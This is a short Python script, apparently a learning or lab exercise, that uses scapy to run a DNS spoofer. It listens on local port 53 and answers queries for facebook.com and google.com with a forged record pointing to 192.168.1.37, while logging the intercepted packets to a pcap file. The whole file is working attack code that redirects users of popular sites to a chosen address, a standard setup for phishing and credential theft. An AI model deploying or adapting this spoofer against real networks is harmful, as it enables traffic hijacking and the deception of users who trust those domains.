from scapy.all import *
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP
import socket

class DNSSpoofer:
    def __init__(self, targets=None, pcap_file="dns_spoofing_traffic.pcap"):
        self.targets = targets or {}
        self.pcap_file = pcap_file
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('127.0.0.1', 53))

    def run(self):
        while True:
            data, addr = self.sock.recvfrom(1024)
            packet = DNS(data)
            spoofed = self.spoof_dns(packet)
            if spoofed:
                self.sock.sendto(bytes(spoofed), addr)

    def spoof_dns(self, packet):
        if DNSQR in packet and packet[DNSQR].qname in self.targets:
            original_summary = packet.summary()
            response = self.build_response(packet)
            modified_summary = response.summary()
            print(f"[Modificado]: {original_summary} -> {modified_summary}")

            # Guardar el paquete en el archivo pcap
            wrpcap(self.pcap_file, packet, append=True)
            return response
        return None

    def build_response(self, packet):
        spoofed_ip = self.targets.get(packet[DNSQR].qname)
        dns_response = DNS(id=packet[DNS].id, qr=1, qd=packet[DNSQR],
                           an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=spoofed_ip))
        return dns_response

def main():
    targets = {
        b"facebook.com.": "192.168.1.37",
        b"google.com.": "192.168.1.37"
    }
    dnsspoofer = DNSSpoofer(targets=targets)
    dnsspoofer.run()

if __name__ == "__main__":
    main()